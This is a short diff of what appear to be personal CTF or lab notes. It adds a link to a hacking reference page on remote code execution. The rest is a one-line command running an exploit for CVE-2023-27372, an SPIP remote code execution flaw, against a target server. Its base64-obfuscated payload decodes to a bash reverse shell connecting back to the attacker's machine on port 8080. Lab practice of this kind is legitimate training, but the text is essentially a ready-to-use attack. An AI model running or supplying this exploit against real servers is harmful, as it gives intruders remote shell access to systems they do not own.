@@ -1,3 +1,5 @@
 Python3
 
+https://vulp3cula.gitbook.io/hackers-grimoire/exploitation/web-application/rce
+
 python3 CVE-2023-27372.py -u http://10.10.81.78/spip/ -c 'echo YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMy44MS40NS84MDgwIDA+JjEK | base64 -d |bash'
